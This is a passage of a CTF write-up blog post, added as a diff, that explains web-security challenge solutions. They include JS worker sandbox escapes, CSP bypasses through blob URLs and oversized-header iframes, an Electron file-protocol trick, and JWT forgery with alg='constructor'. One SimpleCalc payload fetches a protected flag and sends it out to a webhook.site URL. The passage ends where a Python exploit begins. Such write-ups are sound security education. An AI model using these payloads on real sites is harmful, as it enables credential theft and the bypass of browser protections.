@@ -1,0 +1,218 @@
+### Canvas (4 solves)
+
+This challenge is very interesting!
+
+In simple terms, it throws your code into a worker to execute it. Inside the worker, there are some protective measures that prevent you from accessing `globalThis`. Even if you manage to get XSS within the worker, the only thing you can do is post a message to the main thread. However, the result goes through `setHTML` and is filtered by the browser's Sanitizer API.
+
+The worker's sandbox is quite interesting. It looks something like this:
+
+``` js
+function allKeys(obj) {
+  let keys = []
+  while (obj !== null) {
+    keys = keys.concat(Object.getOwnPropertyNames(obj))
+    keys = keys.concat(Object.keys(Object.getOwnPropertyDescriptors(obj)))
+    obj = Object.getPrototypeOf(obj)
+  }
+  return [...new Set(keys)]
+}
+
+function hardening() {
+  const fnCons = [function () {}, async function () {}, function* () {}, async function* () {}].map(
+    f => f.constructor
+  )
+  for (const c of fnCons) {
+    Object.defineProperty(c.prototype, 'constructor', {
+      get: function () {
+        throw new Error('Nope')
+      },
+      set: function () {
+        throw new Error('Nope')
+      },
+      configurable: false
+    })
+  }
+  const cons = [Object, Array, Number, String, Boolean, Date, RegExp, Promise, Symbol, BigInt].concat(fnCons)
+  for (const c of cons) {
+    Object.freeze(c)
+    Object.freeze(c.prototype)
+  }
+}
+
+const code = `console.log(1)`
+const argNames = allKeys(globalThis)
+const fn = Function(...argNames, code)
+const callUserFn = t => {
+  try {
+    fn.apply(Object.create(null))
+  } catch (e) {
+    console.error('User function error', e)
+  }
+  return true
+}
+
+// hardening
+hardening()
+callUserFn()
+```
+
+`argNames` collects the names of everything that `global` can access. This way, all the names can be treated as function parameters. It feels something like this:
+
+``` js
+function run(console, Object, String, Number, fetch,...) {
+    
+}
+```
+
+So, no matter what you get, it will be `undefined`. When calling, `this` is also passed as `Object.create(null)`, so it's not easy to escape.
+
+Maple's expected solution involves using try-catch and throwing an error to retrieve the value:
+
+``` js
+try {
+  null.f()
+} catch (e) {
+  TypeError = e.constructor
+}
+Error = TypeError.prototype.__proto__.constructor
+Error.prepareStackTrace = (err, structuredStackTrace) => structuredStackTrace
+try{
+  null.f()
+} catch(e) {
+  const g = e.stack[2].getFunction().arguments[0].target
+  if (g) { throw { message: g } }
+}
+```
+
+He used a similar technique before in the DiceCTF 2022 - undefined challenge.
+
+However, there is an easier solution for this challenge, utilizing the default behavior of `this`, as shown below:
+
+``` js
+function a() {
+   this.console.log('hello') 
+}
+a()
+```
+
+In JavaScript, when calling a function, the default `this` will be the global object. By using this, you can bypass restrictions.
+
+But what can you do after bypassing the restrictions? It seems that you can't do much in the worker because the main thread's `setHTML` filters the content, and the CSP of this challenge is `default-src 'self' 'unsafe-eval'`.
+
+The key lies in the blob URL. You can create a new HTML using blob and load it. The origin of this new HTML is the same as the original one:
+
+``` js
+const u = this.URL.createObjectURL(new this.Blob(['<h1>peko</h1>'], { type: 'text/html' }))
+location = u
+```
+
+What surprised me about this challenge is that the `<meta>` redirect can also be redirected to a blob URL. So, by combining meta redirect, you can make the top-level page your own HTML and bypass the sanitizer's restrictions.
+
+However, at this point, the CSP is inherited, so you still need to bypass the CSP. Here, you can use `worker.js` again, load it as a regular script, and execute XSS under the main thread.
+
+This challenge is really interesting, and the use of blob is quite clever.
+
+### AMF (4 solves)
+
+I'm a bit lazy to study Python stuff, so I'll leave it for now. The author has written a writeup.
+
+### Harmony (2 solves)
+
+This challenge involves various Electron black magic.
+
+In Chromium, domains ending with `.localhost` are ignored when using the file protocol, for example:
+
+```
+// fail
+file://www.youtube.com.attacker.com/etc/passwd
+
+// success
+file://www.youtube.com.localhost/etc/passwd
+```
+
+(I feel like I accidentally came across this code before)
+
+And `file://` is filtered out by DOMPurify, but since the webpage itself is a file, you can change it to use `//` to bypass the check.
+
+Next, `file://` is same-origin in Electron, so after loading your own file, you can access `top.api`.
+
+Finally, by combining some prototype pollution techniques, you can achieve RCE (I didn't study the second half in detail, you can refer to the author's writeup).
+
+### Sharer's World (1 solve)
+
+The key to this challenge is something called SXG: https://web.dev/signed-exchanges/
+
+I had never heard of this before this competition, and it turns out that the reference material on web.dev was available as early as 2021. It seems like I've been lagging behind for too long.
+
+Simply put, SXG allows you to sign a webpage with a certificate. When other websites send this signed resource, the browser treats it as if it is from the certified website.
+
+For example, suppose someone from example.com signs a webpage with their private key, creating an example.sxg file. Then I get this file and put it on my server with the URL: https://huli.tw/example.sxg
+
+When a user visits https://huli.tw/example.sxg, the content will be the previous website, and the URL will become example.com, as if this webpage came directly from example.com.
+
+## SECCON CTF 2023
+
+As a JavaScript enthusiast, I really liked the challenges in this SECCON CTF. They were full of JavaScript. Although I couldn't solve some of the challenges, I still learned a lot.
+
+### Bad JWT (107 solves)
+
+The goal of this challenge is to generate a JWT with `isAdmin: true`. The key lies in the logic of JWT verification:
+
+``` js
+const algorithms = {
+  hs256: (data, secret) => 
+    base64UrlEncode(crypto.createHmac('sha256', secret).update(data).digest()),
+  hs512: (data, secret) => 
+    base64UrlEncode(crypto.createHmac('sha512', secret).update(data).digest()),
+}
+
+const createSignature = (header, payload, secret) => {
+  const data = `${stringifyPart(header)}.${stringifyPart(payload)}`;
+  const signature = algorithms[header.alg.toLowerCase()](data, secret);
+  return signature;
+}
+```
+
+If `header.alg` is `constructor`, it becomes `const signature = Object(data,secret)`, and the resulting signature becomes a string object that only contains data, ignoring the secret:
+
+``` js
+console.log(Object("data", "secret")) // String {'data'}
+```
+
+Therefore, you just need to construct a signature that is the same.
+
+For a more detailed writeup, you can refer to: https://github.com/xryuseix/CTF_Writeups/tree/master/SECCON2023
+
+### SimpleCalc (23 solves)
+
+This question allows you to execute arbitrary JavaScript, but you need to use fetch with the X-FLAG header to get the flag. However, it will be blocked by CSP:
+
+```  js
+app.use((req, res, next) => {
+  const js_url = new URL(`http://${req.hostname}:${PORT}/js/index.js`);
+  res.header('Content-Security-Policy', `default-src ${js_url} 'unsafe-eval';`);
+  next();
+});
+```
+
+By creating a response with a header that is too large and embedding it in an iframe, you can obtain a same-origin page without CSP, bypassing CSP:
+
+``` js
+var f=document.createElement('iframe');
+f.src = `http://localhost:3000/js/index.js?q=${'a'.repeat(20000)}`;
+document.body.appendChild(f);
+f.onload = () => {    
+    f.contentWindow.fetch('/flag', { headers: {'X-FLAG': 'a'}, credentials:'include' })
+        .then(res => res.text())
+        .then(flag => location='https://webhook.site/2ba35f39-faf4-4ef2-86dd-d85af29e4512?q='+flag)
+}
+```
+
+Interestingly, using `window.open` does not work. It is said that window.open will redirect the error page to a place like `chrome://error`, so the origin becomes null.
+
+The expected solution for this question is actually a service worker. It can be used under http + localhost to remove the CSP header by relying on the service worker.
+
+Below is @DimasMaulana's exploit:
+
+```py
+from urllib.parse import quote
